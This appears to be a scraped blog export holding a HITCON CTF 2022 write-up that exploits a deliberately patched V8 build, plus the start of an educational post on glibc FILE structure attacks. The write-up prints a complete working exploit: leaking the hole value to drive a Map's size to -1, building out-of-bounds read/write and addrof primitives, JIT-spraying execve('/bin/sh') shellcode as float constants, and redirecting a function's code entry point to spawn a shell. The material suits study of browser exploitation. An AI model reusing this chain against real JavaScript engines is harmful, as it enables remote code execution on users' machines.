setup the environment (I followed the environment setup by Faraz‚Äôs article): # Install depot_tools and put it in the PATH git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git echo \"export PATH=\u003cyour_depot_tools_path\u003e:$PATH\" \u003e\u003e ~/.zshrc # Prepare the needed files to build fetch v8 cd v8 ./build/install-build-deps.sh git checkout \u003ccommit_hash\u003e gclient sync git apply add_hole.patch ./tools/dev/v8gen.py x64.release After executing the above script, there will be a file called args.gn inside the out.gn/x64.release folder. Add these lines to the file before building it to make our debugging life easier symbol_level = 2 v8_enable_object_print = true And then we will build it with the below command # Build it (It took me an hour to build it, so be patient) ninja -C ./out.gn/x64.release Additional Step: My pwndbg doesn‚Äôt recognize the job command, which is very useful to debug the v8 shell later. After spending some quite time, turn out the solution is I need to add this LOC to my .gdbinit file: source \u003cpath_to_your_v8_folder\u003e/tools/gdbinit After we successfully build the d8 binary, then we are ready to start the challenge. ","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:1:2","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"Analyze the patch Let‚Äôs check the patch file. diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc index 6e0cd408e7..aafdfb8544 100644 --- a/src/builtins/builtins-array.cc +++ b/src/builtins/builtins-array.cc @@ -395,6 +395,12 @@ BUILTIN(ArrayPush) { return *isolate-\u003efactory()-\u003eNewNumberFromUint((new_length)); } +BUILTIN(ArrayHole){ + uint32_t len = args.length(); + if(len \u003e 1) return ReadOnlyRoots(isolate).undefined_value(); + return ReadOnlyRoots(isolate).the_hole_value(); +} + namespace { V8_WARN_UNUSED_RESULT Object GenericArrayPop(Isolate* isolate, diff --git a/src/builtins/builtins-collections-gen.cc b/src/builtins/builtins-collections-gen.cc index 78b0229011..55aaaa03df 100644 --- a/src/builtins/builtins-collections-gen.cc +++ b/src/builtins/builtins-collections-gen.cc @@ -1763,7 +1763,7 @@ TF_BUILTIN(MapPrototypeDelete, CollectionsBuiltinsAssembler) { \"Map.prototype.delete\"); // This check breaks a known exploitation technique. See crbug.com/1263462 - CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant())); + //CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant())); const TNode\u003cOrderedHashMap\u003e table = LoadObjectField\u003cOrderedHashMap\u003e(CAST(receiver), JSMap::kTableOffset); diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h index 0e98586f7f..28a46f2856 100644 --- a/src/builtins/builtins-definitions.h +++ b/src/builtins/builtins-definitions.h @@ -413,6 +413,7 @@ namespace internal { TFJ(ArrayPrototypeFlat, kDontAdaptArgumentsSentinel) \\ /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */ \\ TFJ(ArrayPrototypeFlatMap, kDontAdaptArgumentsSentinel) \\ + CPP(ArrayHole) \\ \\ /* ArrayBuffer */ \\ /* ES #sec-arraybuffer-constructor */ \\ diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc index 79bdfbddcf..c42ad4c789 100644 --- a/src/compiler/typer.cc +++ b/src/compiler/typer.cc @@ -1722,6 +1722,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) { return Type::Receiver(); case Builtin::kArrayUnshift: return t-\u003ecache_-\u003ekPositiveSafeInteger; + case Builtin::kArrayHole: + return Type::Oddball(); // ArrayBuffer functions. case Builtin::kArrayBufferIsView: diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc index 9040e95202..a77333287a 100644 --- a/src/init/bootstrapper.cc +++ b/src/init/bootstrapper.cc @@ -1800,6 +1800,7 @@ void Genesis::InitializeGlobal(Handle\u003cJSGlobalObject\u003e global_object, Builtin::kArrayPrototypeFindIndex, 1, false); SimpleInstallFunction(isolate_, proto, \"lastIndexOf\", Builtin::kArrayPrototypeLastIndexOf, 1, false); + SimpleInstallFunction(isolate_, proto, \"hole\", Builtin::kArrayHole, 0, false); SimpleInstallFunction(isolate_, proto, \"pop\", Builtin::kArrayPrototypePop, 0, false); SimpleInstallFunction(isolate_, proto, \"push\", Builtin::kArrayPrototypePush, After reading the patch, some interesting information: It introduces a new function called hole in an array. If we read the BUILTIN(ArrayHole) definition, the hole function: Doesn‚Äôt need any args Will return a value from the_hole_value() It disables a CSA_CHECK, which job is to make sure that the assigned key isn‚Äôt hole, and also it has a link to crbug.com/1263462 which contains the exploitation related to the hole value. We will visit this site soon to gain some information on what is hole value. ","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:1:3","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"Searching for the hole value I don‚Äôt have any idea what is hole and why it is dangerous. So, I decided to read through the article that was mentioned in the patch first. After reading through the crbug article, turns out hole is a constant defined in the v8 source code. Due to special handling of the hole value in the javascript Map datatype, if we got a leak of the hole value and set it as one of the Map object keys, we can corrupt the Map length to -1, because somehow, we can call Map.delete(hole) twice, which leads to decrement the Map size by two for one key only. Below is the simple POC stated in the article: var map = new Map(); map.set(1, 1); map.set(hole, 1); // Due to special handling of hole values, this ends up setting the size of the map to -1 map.delete(hole); map.delete(hole); map.delete(1); // Size is now -1 //print(map.size); Now that we know the bug introduced in the patch, we can move to the next step, which is trying to find a way to exploit this bug. ","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:1:4","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"Exploitation Now, our first plan would be to recreate the simple POC created in the article locally and try to examine the memory layout after the corruption. But before that, we should gain some knowledge first on how Map is represented. ","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:2:0","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"Understanding how Map works First, let‚Äôs prepare a js file called poc.js, which contains: var c = []; m = new Map(); m.set(1, 1); m.set(c.hole(), 1); Let‚Äôs start the d8 via gdb. Don‚Äôt forget to add --allow-natives-syntax so that we can use commands like %DebugPrint inside the d8, and --shell so that after executing our script, the interpreter will be still running, and we can continue to debug it. ‚ï∞‚îÄ‚ùØ gdb d8 GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1 Copyright (C) 2022 Free Software Foundation, Inc. ... pwndbg\u003e run --allow-natives-syntax --shell ./poc.js Let‚Äôs try to examine the memory layout. First, try to inspect the m object via %DebugPrint: V8 version 11.0.0 (candidate) d8\u003e %DebugPrint(m) DebugPrint: 0x3ba20005380d: [JSMap] - map: 0x3ba2001862f1 \u003cMap[16](HOLEY_ELEMENTS)\u003e [FastProperties] - prototype: 0x3ba200186431 \u003cObject map = 0x3ba200186319\u003e - elements: 0x3ba200002259 \u003cFixedArray[0]\u003e [HOLEY_ELEMENTS] - table: 0x3ba20005381d \u003cOrderedHashMap[17]\u003e - properties: 0x3ba200002259 \u003cFixedArray[0]\u003e - All own properties (excluding elements): {} ... We can shift our focus towards the table properties which is an OrderedHashMap (I recommend you to read this article to gain a better understanding of how the OrderedHashMap works in v8). table is the one that stores the Map elements, current capacity, and buckets. Let‚Äôs try to examine the table memory (Remember that we need to subtract the object address returned by the %DebugPrint by 1 in GDB). pwndbg\u003e x/30wx 0x3ba20005381d-1 0x3ba20005381c: 0x00002c29 0x00000022 0x00000004 0x00000000 0x3ba20005382c: 0x00000004 0x00000002 0xfffffffe 0x00000002 0x3ba20005383c: 0x00000002 0xfffffffe 0x00002459 0x00000002 0x3ba20005384c: 0x00000000 0x000023e1 0x000023e1 0x000023e1 0x3ba20005385c: 0x000023e1 0x000023e1 0x000023e1 0x000021b9 0x3ba20005386c: 0x00000008 0x00000004 0x00000000 0x00197aa7 0x3ba20005387c: 0x000023e1 0x000023e1 0x000021b9 0x00000008 0x3ba20005388c: 0x00000008 0x00000000 We can use the job commands provided by the v8 developers so that we can deduce what the raw data represents. pwndbg\u003e job 0x3ba20005381d 0x3ba20005381d: [OrderedHashMap] - FixedArray length: 17 - elements: 2 - deleted: 0 - buckets: 2 - capacity: 4 - buckets: { 0: 1 1: -1 } - elements: { 0: 1 -\u003e 1 } pwndbg\u003e job 0x3ba200002459 0x3ba200002459: [Oddball] in ReadOnlySpace: #hole So, connecting the dots, the rough layout of some important metadata of the OrderedHashMap: table + 0x10 =\u003e Map capacity (0x4) table + 0x14 =\u003e Bucket-0 data table + 0x18 =\u003e Bucket-1 data table + 0x1c =\u003e Entry-0 key (0x00000002) table + 0x20 =\u003e Entry-0 value (0x00000002) table + 0x24 =\u003e Entry-0 next_ptr table + 0x28 =\u003e Entry-1 key (0x00002459) table + 0x2c =\u003e Entry-1 value (0x00000002) table + 0x30 =\u003e Entry-1 next_ptr Info Integer is represented as 31-bit in v8, which is why 0x1 is represented as 0x2. Another example, -1 is represented as 0xfffffffe in the raw memory data. Info v8 has pointer compression method (Read this article for a better understanding). tl;dr; v8 only store lower 32-bit of a pointer in the memory, and storing the base upper 32-bit in a specific register. And every time v8 want to use it, it will do calculation like ptr = base_upper + stored_lower. This is why when we set hole as the key, the stored value is only the lower 32-bit of the hole address, which is 0x2459. Note job is failed to print the map elements properly because of the second element‚Äôs key is hole. In normal condition, the job command will print all the map elements correctly. Reading through the previous article that I recommend you to read about the detailed implementation of OrderedHashMap in JS, some important key information about map: Capacity is required to be a power of 2 Number of buckets = Capacity / 2 ","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:2:1","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"The corrupted map‚Äôs impact Now, it‚Äôs time for us to try to re-create the simple POC that the crbug article gave. I recommend you to read this article because it helps me a lot to exploit the corrupted map later. Let‚Äôs change our poc.js file contents to like below: var c = []; m = new Map(); m.set(1, 1); m.set(c.hole(), 1); m.delete(c.hole()); m.delete(c.hole()); m.delete(1); Let‚Äôs try to examine this in the gdb. d8\u003e m.size -1 The POC is working, now we have a map where its size = -1. What is the impact? Let‚Äôs just try to check the impact by trying to set a new pair of (key, value) to the corrupted map, hoping that we can somehow trigger Out-of-Bounds write. d8\u003e m.set(0x8, -1) ... # Back to gdb and examine the table properties memory. pwndbg\u003e x/40wx 0x2b4f0027fbfd-1 0x2b4f0027fbfc: 0x00002c29 0x00000022 0x00000000 0x00000000 0x2b4f0027fc0c: 0x00000010 0xfffffffe 0xfffffffe 0x000023e1 0x2b4f0027fc1c: 0x000023e1 0x000023e1 0x000023e1 0x000023e1 0x2b4f0027fc2c: 0x000023e1 0x000023e1 0x000023e1 0x000023e1 0x2b4f0027fc3c: 0x000023e1 0x000023e1 0x000023e1 0x000025d5 0x2b4f0027fc4c: 0x928a22d2 0x00000004 0x29386428 0x000025d5 0x2b4f0027fc5c: 0x71bade4e 0x00000006 0x69732e6d 0x0027657a 0x2b4f0027fc6c: 0x00002231 0x00000004 0xe3e5e7e0 0x0027fc49 0x2b4f0027fc7c: 0x00003039 0x00000004 0xb859fc74 0x0019a803 0x2b4f0027fc8c: 0x000022c9 0x000006e8 0x0cebf631 0x31d00148 Notice that table+0x10 value, which is the map‚Äôs capacity got overwritten with our set key (0x10 is the 0x8 integer representation in JS). Let‚Äôs verify this with the job command. pwndbg\u003e job 0x2b4f0027fbfd 0x2b4f0027fbfd: [OrderedHashMap] - FixedArray length: 17 - elements: 0 - deleted: 0 - buckets: 8 - capacity: 16 - buckets: { 0: -1 1: -1 2: 0x2b4f000023e1 \u003cundefined\u003e 3: 0x2b4f000023e1 \u003cundefined\u003e 4: 0x2b4f000023e1 \u003cundefined\u003e 5: 0x2b4f000023e1 \u003cundefined\u003e 6: 0x2b4f000023e1 \u003cundefined\u003e 7: 0x2b4f000023e1 \u003cundefined\u003e } - elements: { } Voila, we have successfully overwritten the map‚Äôs capacity, and because of that, the buckets got extended, and the elements‚Äô location will be shifted as well. That means, by corrupting the map size to -1, due to the corrupted capacity value after the first map.set call (after the size is -1), when the map.set method got called for the second time, it will store the map entry (key, value, next_ptr) in the outside of the map (OOB write to the objects below the map object). Let‚Äôs try to prove it by modifying our poc.js file to: var c = []; m = new Map(); m.set(1, 1); m.set(c.hole(), 1); m.delete(c.hole()); m.delete(c.hole()); m.delete(1); oob_arr = new Array(1.1, 2.2); Below is the oob_arr address retrieved from the %DebugPrint: d8\u003e %DebugPrint(m) DebugPrint: 0x1d9d0028756d: [JSMap] - map: 0x1d9d001862f1 \u003cMap[16](HOLEY_ELEMENTS)\u003e [FastProperties] - prototype: 0x1d9d00186431 \u003cObject map = 0x1d9d00186319\u003e - elements: 0x1d9d00002259 \u003cFixedArray[0]\u003e [HOLEY_ELEMENTS] - table: 0x1d9d0028764d \u003cOrderedHashMap[17]\u003e - properties: 0x1d9d00002259 \u003cFixedArray[0]\u003e - All own properties (excluding elements): {} ... d8\u003e %DebugPrint(oob_arr) DebugPrint: 0x1d9d00287699: [JSArray] - map: 0x1d9d0018e6bd \u003cMap[16](PACKED_DOUBLE_ELEMENTS)\u003e [FastProperties] - prototype: 0x1d9d0018e11d \u003cJSArray[0]\u003e - elements: 0x1d9d002876b1 \u003cFixedDoubleArray[2]\u003e [PACKED_DOUBLE_ELEMENTS] - length: 2 - properties: 0x1d9d00002259 \u003cFixedArray[0]\u003e - All own properties (excluding elements): { 0x1d9d00006551: [String] in ReadOnlySpace: #length: 0x1d9d00144255 \u003cAccessorInfo name= 0x1d9d00006551 \u003cString[6]: #length\u003e, data= 0x1d9d000023e1 \u003cundefined\u003e\u003e (const accessor descriptor), location: descriptor } - elements: 0x1d9d002876b1 \u003cFixedDoubleArray[2]\u003e { 0: 1.1 1: 2.2 } ... Let‚Äôs examine it in gdb: pwndbg\u003e x/30wx 0x1d9d0028764d-1 0x1d9d0028764c: 0x00002c29 0x00000022 0xfffffffe 0x00000000 0x1d9d0028765c: 0x00000004 0xfffffffe 0xfffffffe 0x000023e1 0x1d9d0028766c: 0x000023e1 0x000023e1 0x000023e1 0x000023e1 0x1d9d0028767c: 0x000023e1 0x000023e1 0x000023e1 0x000023e1 0x1d9d0028768c: 0x000023e1 0x000023e1 ","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:2:2","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"Preparing primitives Now that we have an array that can do OOB read and write, to control the RIP, we need to be able to perform: addrof: Get the address of an object. read : Read the value of the given address. write : Write a value to the given address. Creating helpers To make our life easier, we need to define some helpers to easily convert from floating point to hex and vice-versa (Notice that everytime we access oob_arr elements, the returned value is in form of floating-point). Helpers are taken from Faraz‚Äôs blog. var buf = new ArrayBuffer(8); var f64_buf = new Float64Array(buf); var u64_buf = new Uint32Array(buf); function ftoi(val) { f64_buf[0] = val; return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) \u003c\u003c 32n); } function itof(val) { u64_buf[0] = Number(val \u0026 0xffffffffn); u64_buf[1] = Number(val \u003e\u003e 32n); return f64_buf[0]; } Creating addrof Let‚Äôs start by creating the easiest method, which is addrof. The trick is simple (inspired from this article): Create a new variable called victim, which is an array of empty objects. Assign the targeted object to one of the elements of the victim‚Äôs array. After this, now the assigned victim‚Äôs element will store a pointer to the address of the targeted object (lower 32-bit only). Using OOB read from the oob_arr, read the victim‚Äôs elements‚Äô stored value (which is the targeted object address). Modify the poc.js to: ... // Helpers is put at the top of these LOCs var c = []; m = new Map(); m.set(1, 1); m.set(c.hole(), 1); m.delete(c.hole()); m.delete(c.hole()); m.delete(1); oob_arr = new Array(1.1, 2.2); victim = [{}, {}, {}, {}]; function addrof(in_obj) { mask = (1n \u003c\u003c 32n) - 1n victim[0] = in_obj; return ftoi(oob_arr[12]) \u0026 mask; } Notes: Remember that v8 only store the lower 32-bit of the object address, while oob_arr value is a 64-bit floating point, so the addrof method will need to be masked so that it will return only the lower 32-bits. Sometimes, the correct offset for the oob_arr is changing during development. You need to examine it in the gdb properly so that oob_arr[chosen_offset] will return the targeted object address stored inside the victim[0] Creating Read After having addrof method, we need to be able to read the given address value. I decided to create a read method where: It can only read addresses relative to the stored js_base, so it can‚Äôt read the value outside the js heap. Send only the lower 32-bit of your targeted address (must be inside the js heap). It will return a 64-bit floating point value of the resolved address‚Äôs value. The trick that I used: Create an array called read_gadget which consists of floating-point values. With OOB write from the oob_arr, overwrite the read_gadget elements pointer so that it points to target_addr-0x8. Why -0x8, because the first element of the array is stored in elements+0x8, so by setting the elements to point to target_addr-0x8, accessing read_gadget[0] will point to the target_addr value. Return it Modify the poc.js to: ... // Helpers is put at the top of these LOCs var c = []; m = new Map(); m.set(1, 1); m.set(c.hole(), 1); m.delete(c.hole()); m.delete(c.hole()); m.delete(1); oob_arr = new Array(1.1, 2.2); read_gadget = [1.1, 2.2, 3.3]; function addrof(in_obj) { mask = (1n \u003c\u003c 32n) - 1n victim[0] = in_obj; return ftoi(oob_arr[12]) \u0026 mask; } function weak_read(addr) { oob_arr[37] = itof(0x600000000n+addr-0x8n); return ftoi(read_gadget[0]); } Notes: The correct offset of oob_arr which points to the properties of read_gadget elements might be changed during the development of our exploit. Always double-check it in gdb Because oob_arr is overwriting the whole 64-bit of the given address, we need to overwrite the read_gadget length as well, which is why I add the targeted address with 0x600000000 as the 32 upper-bit value. Creating Write Now that we have read, it‚Äôs time to create the write. How to do it? Very simple. Same as weak_read method, but instead of returning the read_gadget[0] value, we assign the read_gadget[0] value wi","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:2:3","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"Finding a way to control the RIP Now that we have all the primitives that we need, we will move to our last step, which is controlling the RIP. After reading some articles, I find this article very helpful for me. Reading through the article, we actually can smuggle shellcode via JIT Spraying attack. To smuggle it, what we can do is translate our shellcode to a floating-point number, so that our floating-point number hex is stored as it is in the Jitted function area. For example, consider this code (taken from the article that I mentioned above). const foo = ()=\u003e { return [1.0, 1.95538254221075331056310651818E-246, 1.95606125582421466942709801013E-246, 1.99957147195425773436923756715E-246, 1.95337673326740932133292175341E-246, 2.63486047652296056448306022844E-284]; } for (let i = 0; i \u003c 0x10000; i++) {foo();foo();foo();foo();} The floating-point defined in the javascript is actually the smuggled shellcode which will do sys_execve('/bin/sh'). Because the function is called so many times, v8 will JIT the code. Let‚Äôs try to examine what happen when the method foo got jitted by v8 with the help of %DebugPrint and job after executing the above code. d8\u003e %DebugPrint(foo) DebugPrint: 0x1d9d002ca78d: [Function] in OldSpace - map: 0x1d9d00184241 \u003cMap[28](HOLEY_ELEMENTS)\u003e [FastProperties] - prototype: 0x1d9d001840f5 \u003cJSFunction (sfi = 0x1d9d00145dfd)\u003e - elements: 0x1d9d00002259 \u003cFixedArray[0]\u003e [HOLEY_ELEMENTS] - function prototype: \u003cno-prototype-slot\u003e - shared_info: 0x1d9d0019a025 \u003cSharedFunctionInfo foo\u003e - name: 0x1d9d00199ea5 \u003cString[3]: #foo\u003e - formal_parameter_count: 0 - kind: ArrowFunction - context: 0x1d9d0019a2a1 \u003cScriptContext[3]\u003e - code: 0x1d9d0019a79d \u003cCodeDataContainer TURBOFAN\u003e ... # Back to GDB pwndbg\u003e x/20wx 0x1d9d002ca78d-1 0x1d9d002ca78c: 0x00184241 0x00002259 0x00002259 0x0019a025 0x1d9d002ca79c: 0x0019a2a1 0x0019a271 0x0019a79d 0x000025d5 0x1d9d002ca7ac: 0x00000003 0x00000006 0x626f6c67 0x00006c61 0x1d9d002ca7bc: 0x000025d5 0x00000003 0x00000006 0x6b726f57 0x1d9d002ca7cc: 0x00007265 0x000025d5 0x00000003 0x00000005 Notice that there is a property called code inside the foo method, where based on examination in gdb, the offset is code = foo+0x18. Let‚Äôs examine the code property in gdb. pwndbg\u003e x/20wx 0x1d9d0019a79d-1 0x1d9d0019a79c: 0x00002a71 0x000023e1 0xc0004781 0xc00047c0 0x1d9d0019a7ac: 0x00005554 0xffff001d 0x00000004 0x000079f9 0x1d9d0019a7bc: 0x000023e1 0x00000000 0x00000000 0x00000002 0x1d9d0019a7cc: 0x00000002 0x000023e1 0x000079f9 0x000023e1 0x1d9d0019a7dc: 0x002875c9 0x000023e1 0x00000002 0x00000002 pwndbg\u003e job 0x1d9d0019a79d 0x1d9d0019a79d: [CodeDataContainer] in OldSpace - map: 0x1d9d00002a71 \u003cMap[28](CODE_DATA_CONTAINER_TYPE)\u003e - kind: TURBOFAN - is_off_heap_trampoline: 0 - code: 0x5554c0004781 \u003cCode TURBOFAN\u003e - code_entry_point: 0x5554c00047c0 - kind_specific_flags: 4 pwndbg\u003e job 0x5554c0004781 0x5554c0004781: [Code] - map: 0x1d9d0000264d \u003cMap(CODE_TYPE)\u003e - code_data_container: 0x1d9d0019a79d \u003cCodeDataContainer TURBOFAN\u003e kind = TURBOFAN stack_slots = 6 compiler = turbofan address = 0x5554c0004781 Instructions (size = 360) 0x5554c00047c0 0 8b59d0 movl rbx,[rcx-0x30] 0x5554c00047c3 3 4903de REX.W addq rbx,r14 ... 0x5554c0004831 71 49ba682f73680058eb0c REX.W movq r10,0xceb580068732f68 0x5554c000483b 7b c4c1f96ec2 vmovq xmm0,r10 0x5554c0004840 80 c5fb11410f vmovsd [rcx+0xf],xmm0 0x5554c0004845 85 49ba682f62696e5aeb0c REX.W movq r10,0xceb5a6e69622f68 0x5554c000484f 8f c4c1f96ec2 vmovq xmm0,r10 0x5554c0004854 94 c5fb114117 vmovsd [rcx+0x17],xmm0 0x5554c0004859 99 49ba48c1e02031f6eb0c REX.W movq r10,0xcebf63120e0c148 0x5554c0004863 a3 c4c1f96ec2 vmovq xmm0,r10 0x5554c0004868 a8 c5fb11411f vmovsd [rcx+0x1f],xmm0 0x5554c000486d ad 49ba4801d031d250eb0c REX.W movq r10,0xceb50d231d00148 0x5554c0004877 b7 c4c1f96ec2 vmovq xmm0,r10 0x5554c000487c bc c5fb114127 vmovsd [rcx+0x27],xmm0 0x5554c0004881 c1 49ba4889e76a3b580f05 REX.W movq r10,0x50f583b6ae78948 Inside code property, we have two interesting properties: code: P","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:2:4","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"Final Step With our write gadget, let‚Äôs overwrite this code_entry_point by shifting its stored value to point to our first smuggled shellcode so that when we call foo, it will jump and execute our crafted shellcode. Notes that it is better to put the targeted JIT code at the top of our file so that it won‚Äôt mess up our created read-and-write gadgets. So, modify our poc.js to: const foo = ()=\u003e { return [1.0, 1.95538254221075331056310651818E-246, 1.95606125582421466942709801013E-246, 1.99957147195425773436923756715E-246, 1.95337673326740932133292175341E-246, 2.63486047652296056448306022844E-284]; } for (let i = 0; i \u003c 0x10000; i++) {foo();foo();foo();foo();} var buf = new ArrayBuffer(8); var f64_buf = new Float64Array(buf); var u64_buf = new Uint32Array(buf); function ftoi(val) { f64_buf[0] = val; return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) \u003c\u003c 32n); } function itof(val) { u64_buf[0] = Number(val \u0026 0xffffffffn); u64_buf[1] = Number(val \u003e\u003e 32n); return f64_buf[0]; } var c = []; m = new Map(); m.set(1, 1); m.set(c.hole(), 1); m.delete(c.hole()); m.delete(c.hole()); m.delete(1); oob_arr = new Array(1.1, 2.2); m.set(0x10, -1); m.set(oob_arr, 0xffff); victim = [{}, {}, {}, {}]; read_gadget = [1.1, 2.2, 3.3]; function addrof(in_obj) { mask = (1n \u003c\u003c 32n) - 1n victim[0] = in_obj; return ftoi(oob_arr[12]) \u0026 mask; } function weak_read(addr) { oob_arr[37] = itof(0x600000000n+addr-0x8n); return ftoi(read_gadget[0]); } function weak_write(addr, value) { oob_arr[37] = itof(0x600000000n+addr-0x8n); read_gadget[0] = itof(value); } f_code = weak_read(addrof(foo)+0x18n) \u0026 ((1n \u003c\u003c 32n) - 1n); f_code_code_entry_point = weak_read(f_code+0xcn); weak_write(f_code+0xcn, f_code_code_entry_point+124n); foo(); What I do in the last step after creating these primitives are: Get the foo-\u003ecode stored pointer address by: Do addrof of foo. weak_read the address of foo-\u003ecode which is equivalent to foo+0x18 (Offset found by examination in gdb). Let‚Äôs call the fetched value as f_code weak_read the value of f_code-\u003ecode_entry_point which is equivalent to f_code+0xc. Let‚Äôs call the fetched value as f_code_code_entry_point weak_write the property f_code-\u003ecode_entry_point which is equivalent to f_code+0xc by f_code_code_entry_point+shift_offset, where the shift_offset is the distance between the starting JIT code instructions and your smuggled shellcode. Notes: The offset of the smuggled shellcode in the jitted area is different between ubuntu and debian. So, if you want to run this POC in ubuntu, you might need to adjust the offset to be added in our leaked f_code_code_entry_point value during the last call of weak_write. And let‚Äôs try to execute this. We will get a shell! Flag: hitcon{tH3_xPl01t_n0_l0ng3r_wOrk_aF+3r_66c8de2cdac10cad9e622ecededda411b44ac5b3_:((} Social Media Follow me on twitter ","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:2:5","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"When reading some of the pwn challenges in the recent Hacklu CTF 2022, the byor challenge was catching my eye, because it is about a FILE structure attack in the recent glibc. I have played CTF for a while, but I don‚Äôt have any idea about it at all. So, I decided to learn the fundamentals first on what it is and I was writing this note during the process. Some of the attacks or concepts that I will explain in this series won‚Äôt work in the recent glibc. But I believe we need to understand the old version attack first so that we have fundamentals of the FILE structure attack which will help us a lot in understanding the newest attack of it. This note is the summary of various resources that I read during learning about it and I hope that this article will help future me and other people who try to learn about it. Disclaimer Feel free to reach me in case you found any mistake in this article, as this is a new knowledge for me and my understanding might be wrong. FILE Explanation ","date":"Nov 01, 2022","objectID":"/posts/file-structure-attack-part-1/:0:0","tags":["Education","FILE"],"title":"FILE Structure Attack: Part 1","uri":"/posts/file-structure-attack-part-1/"},{"categories":null,"content":"Intro FILE is a data type defined in the glibc which is usually used when we want to open a file in C. Note that this is different from the OS file descriptor that we usually use. The purpose of this data type is basically to make the file operation faster by using a buffer to reduce the number of IO syscall (read, write). The concept (simplified version) is that rather than you use write syscall each time you want to write new data to a file (which will directly write the data to the harddisk), by using the defined methods in the stdio lib for FILE data type operations (in this case is fwrite), stdio will try to handle all the operations by managing the data in the buffer first (resides in memory), and then will move it to the hard disk (via the OS syscall) when a certain condition is met (For example, when the buffer is full or got flushed). ","date":"Nov 01, 2022","objectID":"/posts/file-structure-attack-part-1/:1:0","tags":["Education","FILE"],"title":"FILE Structure Attack: Part 1","uri":"/posts/file-structure-attack-part-1/"},{"categories":null,"content":"Implementation in C Reading through the source code of the glibc, below I try to summarize some notable implementations related to the FILE structure data type that we need to take a look at so that we can understand more about how it works (We use glibc-2.35 in this specific section, but keep in mind that there might be a little different on how the struct is defined on each glibc version). FILE typedef struct _IO_FILE FILE; Turn out, FILE datatype is a struct called _IO_FILE. _IO_FILE /* The tag name of this struct is _IO_FILE to preserve historic C++ mangled names for functions taking FILE* arguments. That name should not be used in new code. */ struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ /* The following pointers correspond to the C++ streambuf protocol. */ char *_IO_read_ptr; /* Current read pointer */ char *_IO_read_end; /* End of get area. */ char *_IO_read_base; /* Start of putback+get area. */ char *_IO_write_base; /* Start of put area. */ char *_IO_write_ptr; /* Current put pointer. */ char *_IO_write_end; /* End of put area. */ char *_IO_buf_base; /* Start of reserve area. */ char *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; int _flags2; __off_t _old_offset; /* This used to be _offset but it's too small. */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; _IO_lock_t *_lock; #ifdef _IO_USE_OLD_IO_FILE }; struct _IO_FILE_complete { struct _IO_FILE _file; #endif __off64_t _offset; /* Wide character stream stuff. */ struct _IO_codecvt *_codecvt; struct _IO_wide_data *_wide_data; struct _IO_FILE *_freeres_list; void *_freeres_buf; size_t __pad5; int _mode; /* Make sure we don't get into trouble again. */ char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)]; }; This is the rough struct of how FILE is implemented. For now, we can skip first how will the fields be used. We will explain more about it later when we talk about the history of the attacking scenario in glibc via FILE structure. _IO_FILE_plus /* We always allocate an extra word following an _IO_FILE. This contains a pointer to the function jump table used. This is for compatibility with C++ streambuf; the word can be used to smash to a pointer to a virtual function table. */ struct _IO_FILE_plus { FILE file; const struct _IO_jump_t *vtable; }; Glibc also has the extended version of _IO_FILE struct called _IO_FILE_plus, which is _IO_FILE + vtable (vtable = virtual table = array of pointers to the helper functions during executing the IO operation). The default filestream (stdin, stdout, stderr) is using this extended version instead of the raw _IO_FILE. Also if you open a file with fopen, it will use this extended version as well. Why do we use the extended version (_IO_FILE_plus)? The purpose is to make the IO operation faster by having the vtable. The data type for the vtable is _IO_jump_t (see below LOCs), which 